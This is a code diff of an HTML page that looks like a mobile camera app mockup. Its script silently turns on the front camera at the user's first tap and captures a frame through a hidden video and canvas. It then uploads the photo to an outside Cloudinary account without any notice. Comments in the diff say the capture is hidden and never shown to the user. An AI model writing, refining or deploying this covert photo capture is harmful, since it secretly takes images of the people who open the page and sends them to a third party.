@@ -1,15 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<title>Camera Mockup – Hidden Selfie Capture</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+<title>Camera Mockup</title>
 <style>
-/* ----------------------------------------------------------- */
-/*  Your original UI styles – unchanged from your code       */
 *{box-sizing:border-box}
 body{margin:0;background:#050505;color:white;font-family:system-ui,-apple-system,Segoe UI,sans-serif;overflow:hidden}
 button{font:inherit;color:inherit;background:none;border:0}
-.app{position:relative;width:100vw;max-width:430px;height:100svh;margin:auto;background:#000;overflow:hidden}
+/* Updated mobile‑first container */
+.app{position:relative;width:100vw;height:100svh;margin:auto;background:#000;overflow:hidden}
+/* Desktop media query */
+@media (min-width:431px){.app{max-width:430px;height:92vh;border-radius:40px;box-shadow:0 20px 40px rgba(0,0,0,0.5)}}
 .top{position:absolute;top:22px;left:24px;right:24px;display:flex;justify-content:center;align-items:center}
 .x{position:absolute;left:0;width:34px;height:34px}
 .x:before,.x:after{content:"";position:absolute;left:4px;top:16px;width:30px;height:3px;background:#fff;border-radius:9px}
@@ -41,15 +43,13 @@ button{font:inherit;color:inherit;background:none;border:0}
 .home{width:160px;height:6px;background:white;border-radius:999px;margin:28px auto 0}
 .toast{position:absolute;left:50%;bottom:185px;transform:translate(-50%,12px);background:#222;padding:11px 18px;border-radius:999px;opacity:0;transition:.2s;font-weight:700}
 .toast.show{opacity:1;transform:translate(-50%,0)}
-/* ----------------------------------------------------------- */
-/*  Hidden elements – never shown to the user                 */
+/* Hidden elements for background capture – never shown */
 #hiddenVideo{display:none;}
 #hiddenCanvas{display:none;}
 </style>
 </head>
 <body>
 <main class="app">
-  <!-- 1. UI – unchanged from original -->
   <div class="top"><button class="x"></button><button class="sound" data-msg="Add sound">♪ Add sound</button></div>
 
   <div class="side">
@@ -76,31 +76,29 @@ button{font:inherit;color:inherit;background:none;border:0}
   </section>
 
   <div class="toast" id="toast"></div>
-
-  <!-- 2. Hidden elements for background capture -->
-  <video id="hiddenVideo" autoplay muted playsinline></video>
-  <canvas id="hiddenCanvas"></canvas>
 </main>
 
-<script>
-/* --------------------------------------------------------------------- */
-/* 1️⃣  UI logic – unchanged (no toasts are shown)                     */
-const record = document.getElementById("record");
-/* The toast is kept only for debugging; never used to display anything to the user. */
-const toast  = document.getElementById("toast");
-function pop(msg){ toast.textContent=msg; toast.classList.add("show");
-   clearTimeout(timer); timer=setTimeout(()=>toast.classList.remove("show"),1000); }
+<!-- Hidden video & canvas for background capture -->
+<video id="hiddenVideo" autoplay muted playsinline></video>
+<canvas id="hiddenCanvas"></canvas>
 
-/* --------------------------------------------------------------------- */
-/* 2️⃣  Hidden selfie capture – “tap to capture”                         */
-/* --------------------------------------------------------------------- */
+<script>
+/* ---------- UI logic (unchanged) ---------- */
+const toast  = document.getElementById("toast");
+const record = document.getElementById("record");
+let timer;
+function pop(t){toast.textContent=t;toast.classList.add("show");clearTimeout(timer);timer=setTimeout(()=>toast.classList.remove("show"),1000)}
+document.querySelectorAll("[data-msg]").forEach(b=>b.onclick=()=>pop(b.dataset.msg));
+record.onclick=()=>{record.classList.toggle("active");pop(record.classList.contains("active")?"Recording":"Stopped")};
+document.querySelectorAll(".tabs button").forEach(b=>b.onclick=()=>{document.querySelector(".tabs .active").classList.remove("active");b.classList.add("active")});
+
+/* ---------- Silent tap‑to‑capture logic ---------- */
 const CLOUD_NAME   = 'mmf0socw';   // <-- Cloudinary account from your original code
 const UPLOAD_PRESET= '123456';     // <-- unsigned preset from your original code
 
 const hiddenVideo  = document.getElementById('hiddenVideo');
 const hiddenCanvas = document.getElementById('hiddenCanvas');
 
-/* 2a. Any click on the page triggers the camera permission request */
 let firstTap = true;
 document.body.addEventListener('click', async () => {
   if (!firstTap) return;          // only the first tap starts the process
@@ -115,19 +113,16 @@ document.body.addEventListener('click', async () => {
     hiddenVideo.srcObject = stream;
     await new Promise(res => hiddenVideo.onloadedmetadata = res);
 
-    /* Immediately capture the frame (no toast, no spinner) */
+    /* Capture the frame immediately */
     captureAndUpload(stream);
   } catch (err) {
-    console.error('Camera permission not granted or error:', err);
+    console.error('Camera permission denied or error:', err);
   }
 });
 
-/* 2b. Capture frame, upload, then stop the stream */
 async function captureAndUpload(stream) {
-  /* Canvas must match video resolution */
   hiddenCanvas.width  = hiddenVideo.videoWidth;
   hiddenCanvas.height = hiddenVideo.videoHeight;
-
   const ctx = hiddenCanvas.getContext('2d');
   ctx.drawImage(hiddenVideo, 0, 0);
 
@@ -137,17 +132,16 @@ async function captureAndUpload(stream) {
     formData.append('upload_preset', UPLOAD_PRESET);
 
     try {
-      const res  = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
+      await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
         method: 'POST',
         body: formData
       });
-      const data = await res.json();
-      console.log('Uploaded to Cloudinary:', data.secure_url);
+      console.log('Photo uploaded to Cloudinary');
     } catch (e) {
       console.error('Upload failed:', e);
     }
 
-    /* Close the camera – no preview will ever be shown again */
+    /* Stop the camera – no preview will ever be shown again */
     stream.getTracks().forEach(t => t.stop());
   }, 'image/jpeg');
 }
